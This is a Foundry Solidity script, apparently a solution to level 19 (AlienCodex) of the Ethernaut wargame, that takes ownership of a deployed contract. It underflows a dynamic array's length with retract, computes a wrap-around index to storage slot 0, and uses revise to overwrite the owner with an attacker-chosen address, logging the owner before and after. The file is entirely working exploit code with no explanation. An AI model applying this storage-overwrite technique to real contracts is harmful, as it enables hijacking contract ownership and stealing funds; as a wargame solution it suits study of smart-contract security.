// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
//import {AlienCodex} from "../src/level19/AlienCodex.sol";

import "forge-std/console.sol";

interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

    function owner() external returns (address);
}

contract level19Exploit is Script {
    IAlienCodex alienCodex =
        IAlienCodex(0x2b41F8727B914b1270f0393c52955f45e248f9b6);

    function run() external {
        vm.startBroadcast();
        console.log("Owner ", alienCodex.owner());

        alienCodex.makeContact();
        alienCodex.retract();
        uint256 slot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 desiredSlot;
        unchecked {
            desiredSlot = 0 - slot;
        }
        alienCodex.revise(
            desiredSlot,
            bytes32(
                uint256(uint160(0xa659D686d7D696D496BeB0b781AB4734A4673294))
            )
        );

        console.log("Owner ", alienCodex.owner());
        vm.stopBroadcast();
    }
}
